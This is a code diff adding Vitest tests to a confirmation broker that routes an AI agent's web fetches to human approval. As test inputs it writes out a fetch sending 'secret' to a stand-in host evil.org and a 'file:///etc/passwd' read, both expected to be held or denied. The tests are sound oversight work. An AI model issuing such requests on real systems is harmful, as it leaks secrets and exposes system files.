@@ -2,12 +2,13 @@ import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import type { Confirmation } from '../../shared/connectors'
 import { createConfirmationBroker } from './confirmations'
 
-function setup() {
+function setup(confirmWeb = false) {
   const broker = createConfirmationBroker(1000)
   const shown: Confirmation[] = []
   const resolved: [string, string][] = []
   const runId = broker.openRun({
     labels: { brevo: 'Brevo' },
+    confirmWeb,
     onConfirm: (confirmation) => shown.push(confirmation),
     onResolved: (id, outcome) => resolved.push([id, outcome])
   })
@@ -73,6 +74,23 @@ describe('createConfirmationBroker', () => {
     expect((await broker.request('inconnu', 'mcp__brevo__get_stats', {}).decision).decision).toBe('deny')
     expect((await broker.request(runId, 'mcp__autre__get_stats', {}).decision).decision).toBe('deny')
     expect((await broker.request(runId, 'Bash', {}).decision).decision).toBe('deny')
+  })
+
+  it("montre l'adresse complète d'une page hors liste et attend le clic", async () => {
+    const { broker, runId, shown } = setup(true)
+    const pending = broker.request(runId, 'WebFetch', { url: 'https://evil.org/x?d=secret' })
+    expect(shown[0]).toMatchObject({ kind: 'web', connector: 'Web', tool: 'evil.org', input: { adresse: 'https://evil.org/x?d=secret' } })
+    broker.answer(shown[0]!.id, true)
+    expect((await pending.decision).decision).toBe('allow')
+  })
+
+  it('refuse une page hors liste sans personne pour confirmer, ou une adresse non web', async () => {
+    const unattended = setup(false)
+    expect((await unattended.broker.request(unattended.runId, 'WebFetch', { url: 'https://evil.org/' }).decision).decision).toBe('deny')
+    expect(unattended.shown).toHaveLength(0)
+    const watched = setup(true)
+    expect((await watched.broker.request(watched.runId, 'WebFetch', { url: 'file:///etc/passwd' }).decision).decision).toBe('deny')
+    expect(watched.shown).toHaveLength(0)
   })
 
   it('une confirmation ne vaut que pour son propre appel', async () => {
